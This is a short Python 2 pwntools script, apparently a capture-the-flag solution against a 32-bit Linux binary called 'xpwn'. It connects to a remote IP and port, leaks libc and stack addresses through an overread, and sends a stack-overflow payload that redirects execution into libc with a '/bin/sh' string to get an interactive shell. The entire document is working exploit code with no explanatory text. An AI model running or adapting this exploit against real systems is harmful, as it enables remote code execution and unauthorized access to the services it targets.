from pwn import *
context(os='linux',arch='i386',log_level='debug')
io=remote('116.85.48.105',5005)
#io=process('./xpwn')
pause()
io.recv()
io.sendline('a'*59)
sleep(1)
io.recvuntil('a'*59+'\n')
libc_basic=u32(io.recv(4))
io.recv(8)
stack=u32(io.recv(4))-0x4C
print "func:",
print hex(libc_basic)
libc_basic=libc_basic-0x00065450
print "libc_basic:",
print hex(libc_basic)
binsh=libc_basic+0x0003A940
io.recv(timeout=0.1)
io.send('-1aa'+'/bin/sh'+'\x00'+'a'*4)
sleep(1)
io.recv()
io.sendline(p32(binsh)+4*'a'+p32(0x0804A050)+'a'*56+p32(stack+4))
io.interactive()